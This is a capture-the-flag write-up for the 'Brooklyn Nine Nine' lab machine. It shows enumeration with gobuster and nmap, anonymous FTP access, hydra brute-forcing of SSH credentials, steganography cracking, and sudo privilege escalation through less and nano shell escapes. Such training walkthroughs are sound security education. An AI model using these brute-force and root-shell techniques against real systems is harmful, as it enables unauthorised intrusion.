## Enumeration
So far we can see the image on this website, but we want to make sure that there are no any other directories on this website. For that we can use a tool called `Gobuster`. To use Gobuster we need to specify the host and a wordlist. It is recommended to choose `raft-large-words.txt` wordlist for directory scanning.
```
gobuster dir -u http://10.10.103.153/ -w /opt/wordlists/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.103.153/
[+] Threads:        10
[+] Wordlist:       /opt/wordlists/subdomains-top1million-110000.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/26 11:38:22 Starting gobuster
===============================================================
===============================================================
2022/02/26 11:49:12 Finished
===============================================================
```
```gobuster dir -u http://10.10.235.234/ -w /opt/wordlists/raft-large-words.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.235.234/
[+] Threads:        10
[+] Wordlist:       /opt/wordlists/raft-large-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/26 11:59:38 Starting gobuster
===============================================================
/.html (Status: 403)
/.htm (Status: 403)
/. (Status: 200)
/.htaccess (Status: 403)
/.htc (Status: 403)
/.html_var_DE (Status: 403)
/server-status (Status: 403)
/.htpasswd (Status: 403)
/.html. (Status: 403)
/.html.html (Status: 403)
/.htpasswds (Status: 403)
/.htm. (Status: 403)
/.htmll (Status: 403)
/.html.old (Status: 403)
/.ht (Status: 403)
/.html.bak (Status: 403)
/.htm.htm (Status: 403)
/.hta (Status: 403)
/.html1 (Status: 403)
/.htgroup (Status: 403)
/.html.LCK (Status: 403)
/.html.printable (Status: 403)
/.htm.LCK (Status: 403)
/.htx (Status: 403)
/.html.php (Status: 403)
/.htaccess.bak (Status: 403)
/.htmls (Status: 403)
/.htm2 (Status: 403)
/.htlm (Status: 403)
/.html- (Status: 403)
/.htuser (Status: 403)
/.htm.d (Status: 403)
/.htacess (Status: 403)
/.htm.old (Status: 403)
/.htm.html (Status: 403)
/.html-1 (Status: 403)
/.htmlpar (Status: 403)
/.html.orig (Status: 403)
/.html_ (Status: 403)
/.html_files (Status: 403)
/.html.sav (Status: 403)
/.hts (Status: 403)
/.htmlprint (Status: 403)
/.htm.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htm3 (Status: 403)
/.htm5 (Status: 403)
/.htm7 (Status: 403)
/.htm.rc (Status: 403)
/.htm8 (Status: 403)
/.htm_ (Status: 403)
/.html-- (Status: 403)
/.html-0 (Status: 403)
/.html-c (Status: 403)
/.html-2 (Status: 403)
/.html-old (Status: 403)
/.html.htm (Status: 403)
/.html-p (Status: 403)
/.html.images (Status: 403)
/.html.none (Status: 403)
/.html.inc (Status: 403)
/.html.pdf (Status: 403)
/.html.start (Status: 403)
/.htmlBAK (Status: 403)
/.html.txt (Status: 403)
/.html7 (Status: 403)
/.html5 (Status: 403)
/.html4 (Status: 403)
/.htmlDolmetschen (Status: 403)
/.html_old (Status: 403)
/.htmla (Status: 403)
/.htmlc (Status: 403)
/.htmlfeed (Status: 403)
/.htmlq (Status: 403)
/.htmlu (Status: 403)
/.htn (Status: 403)
===============================================================
2022/02/26 12:11:53 Finished
===============================================================
```
The output from Gobuster was not helpful, we didn't see any new interesting directories.

At the same time let's scan all ports and find out which service and version is behind the port.

```
nmap -p- -sC -sV 10.10.103.153
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-26 11:14 CET
Nmap scan report for 10.10.103.153
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.1.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds
```

We detected that the FTP server running on the remote host allows anonymous logins. Therefore, any remote user may connect and authenticate to the server without providing a password or unique credentials. This allows the user to access any files made available by the FTP server, e.g. a `note_to_jake.txt` file.

So, we will use `anonymous` as a username. As for the password we can use the following common patterns:
- Electronic mail (e-mail) address: `anonymous@10.10.103.153`
- Empty string
- Some common password as `guest`

Let's try to log in as
```
username: anonymous
password: empty string
```
Empty string worked!

Now let's list if there are any hidden files in this FTP server:
```
ls -lah
229 Entering Extended Passive Mode (|||28259|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```

Let's get the text file [note_to_jake.txt](./brooklyn99_note_to_jake.txt) that we spotted during the enumeration with `nmap`.
```
get note_to_jake.txt
```
Now we have it on our machines, let's see the content
```
cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

So, we got our first clue! The users could be `amy`, `holt` and `jake`. We can suspect that we need to find out password for the user `jake`, which is weak.

# Path 1
## Brute-force credentials to get SSH access
Let's use `hydra` tool to brute-force credentials for user `jake`
```
hydra -l jake -P /opt/wordlists/rockyou.txt ssh://10.10.235.234
```
Output:
```
[22][ssh] host: 10.10.235.234   login: jake   password: <intentionally_removed_from_writeup>
```
A protection against brute-force attack is to set up keys and have a lockout mechanism. Now let's set up SSH connection to the server.
```
ssh jake@10.10.235.234
```
Let's find the flag:
```
find /home -name ".*.txt"
```
This didn't give me much information. Let's check what other users do we have in this server. We can find two other users: `amy` and `host`. Maybe the user flag is in Holt's folder, let's check it out:
```
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
```

Congratulations! We have our user flag.

## Privilege escalation 1st way (User Jake).
To list what commands the current user can perform with sudo:
```
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
In this case, this command `less` is allowed to be executed by sudo on behalf of user `jake`, since he is a part of ALL.

Let's go to [gtfobins](https://gtfobins.github.io/gtfobins/less/#sudo). We are trying to exploit vulnerabilities with `sudo` configuration. The tools like `less` are binaries that can execute commands as a new process. This process will inherit the privileges of parent's process which is `less` in this scenario. So, we are spawning a shell, and in this scenatio, it will get spawned with root privilege:
```
sudo less /etc/profile
```
Now add this line to execute this command (You can click `i` to get to editing mode in `less`):
```
!/bin/sh
```
Press `Enter`

We have spawned a shell. Let's check who are we.
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
Great! We are root user. Now, let's find the flag. Perhaps, the flag will be in a file `root.txt`, since the user flag was in the file `user.txt`

```
# find / -name root.txt
/root/root.txt
```
Let's see the output of the file:
```
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <intentionally_removed_from_writeup>

Enjoy!!
```

Congratulation! We obtained two flags.

# Path 2
# Steganography
When we open the page we can see the huge [banner with all Brooklyn99 main heroes](./brooklyn99_banner.jpg). Let's use "Inspect element". There is a hint in the comment that we should use steganography to find something hidden in the image. For that let's first of all `wget http://10.10.103.153/brooklyn99.jpg`. Now we have the JPEG file.

There are some cool tools that you can use. Let's start one by one.

1. **Binwalk** is a tool that helps to extract hidden files from the image file. If the tools finds anything, it will generate a folder and place the found files there.
```
binwalk -e brooklyn99.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
We can see that we don't have any hidden files here.

2. **Exiftool** is a tool that helps to check the EXIF data (metadata) of the file. Exiftool can provide information about the author, comment, camera or geolocation, and that is why is a very useful tool.
```
exiftool brooklyn99.jpg
ExifTool Version Number         : 12.30
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 68 KiB
File Modification Date/Time     : 2020:05:26 11:01:39+02:00
File Access Date/Time           : 2022:02:26 10:56:39+01:00
File Inode Change Date/Time     : 2022:02:26 10:55:51+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```

4. Next tool is `stegcracker`. This is a brute-force tool to brute-force and find out any hidden files inside the image.
To install stegcracker you need to have another tool `steghide` installed:
```
pip3 install stegcracker
```
Run stegcracker on an image:
```
stegcracker brooklyn99.jpg /opt/wordlists/rockyou.txt  
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99_banner.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20458 passwords
Your file has been written to: brooklyn99_banner.jpg.out
<password_that_stegcracker_found>
```

We found the password, and it seems that we can use it for `holt`. Let's `ssh holt@10.10.73.29`.

## Privilege escalation 2nd way (User Holt).
Let's see which commands are allowed to perform by sudo on user `holt`:
```
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
We can see that `sudo` can execute `nano` command. Let's check [gtfobins](https://gtfobins.github.io/gtfobins/nano/#sudo) for the way to make privilege escalation. The steps are as follows:
- Execute the following command: `sudo nano`
- Type `^R` and `^X` to execute a command
- Type the following command: `reset; sh 1>&0 2>&0`

For some reasons it didn't work for me, so I used another way:
- Execute the following command: `sudo nano -s /bin/sh`
- Type `/bin/sh`
You can see it in the [image below](./brooklyn99_nano.png)
- Leave `nano` tool by pressing `^T`

Congratulations, now you are root again!
```
holt@brookly_nine_nine:~$ sudo nano -s /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Reading list:
[CTF Checklist for beginners: Steganography](https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography)
